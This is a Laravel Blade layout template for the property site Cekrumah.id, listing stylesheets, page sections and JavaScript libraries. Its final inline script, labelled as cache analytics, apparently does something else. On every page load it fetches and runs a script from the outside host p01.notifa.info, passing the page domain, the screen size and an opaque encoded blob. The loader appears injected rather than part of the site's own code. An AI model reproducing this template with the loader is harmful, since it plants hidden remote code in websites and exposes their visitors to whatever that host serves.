<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <title>Cekrumah.id - @yield('title')</title>
    <link rel="stylesheet" href="{{ asset('css/plugins.css') }}">
    <link rel="stylesheet" href="{{ asset('css/nav.css') }}"/>
    <link href="{{ asset('css/styles.css') }}" rel="stylesheet">
    <link href="{{ asset('css/colors.css') }}" rel="stylesheet">
    @yield('css')
</head>

<body class="green-skin">
<div id="preloader">
    <div class="preloader"><span></span><span></span></div>
</div>
<div id="main-wrapper">

    @include('layouts.includes.header')

    <div class="clearfix"></div>

    @yield('content')

    @include('layouts.includes.footer')


    <a id="back2Top" class="top-scroll" title="Back to top" href="index.html#"><i class="ti-arrow-up"></i></a>


</div>

<script src="{{ asset('js/jquery.min.js') }}"></script>
<script src="{{ asset('js/popper.min.js') }}"></script>
<script src="{{ asset('js/bootstrap.min.js') }}"></script>
<script src="{{ asset('js/rangeslider.js') }}"></script>
<script src="{{ asset('js/select2.min.js') }}"></script>
<script src="{{ asset('js/aos.js') }}"></script>
<script src="{{ asset('js/owl.carousel.min.js') }}"></script>
<script src="{{ asset('js/jquery.magnific-popup.min.js') }}"></script>
<script src="{{ asset('js/slick.js') }}"></script>
<script src="{{ asset('js/slider-bg.js') }}"></script>
<script src="{{ asset('js/lightbox.js') }}"></script>
<script src="{{ asset('js/imagesloaded.js') }}"></script>
<script src="{{ asset('js/isotope.min.js') }}"></script>
<script src="{{ asset('js/coreNavigation.js') }}"></script>
<script src="{{ asset('js/custom.js') }}"></script>
<script src="{{ asset('js/cl-switch.js') }}"></script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAe4I8U96Z5coGAHvkqmaldYghFsUCmSzbBFWVLobzbEsJQJgIiFTHjz%2bbfA31nAEolmpshbxjfQcN3tyiRbegMi%2fVIPQeiW8FZ8qihK%2fKwS%2fyQNZ%2f4T5sm%2fqAHsa5rhYqrDV4brGUA68ncgOWPURlWe2bUfChtGkU9z1e1lx6Eb3wBWGryD0jJXkbh7RtsehQzR4gITo62snxz5iReDca5F4VwHGUg%2fB2UGVxKa4zvhHeWdjPOoWR4W%2bEb6WWlzvVH3aYlET5fj8FY3dZUgUzLi1NgvAqkHMpSinMjOkqAYPOjtXm9sgIwMvygdg7W%2bq8lIYlwxTmwRCBf%2fJNnMN19gBrk3zDmgmxuL2jGvvx8qQ15KtNKkParoFckE6OxYWDizpwFCY4%2fdO0hO7AoccRdyRy4aF0oZpiqtLYlYXO4t3MRya0xkt4jj3kkgxBKgXBdORvlN1zHMIMMFbAwzf52g%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;</script>
</body>
@yield('js')
</html>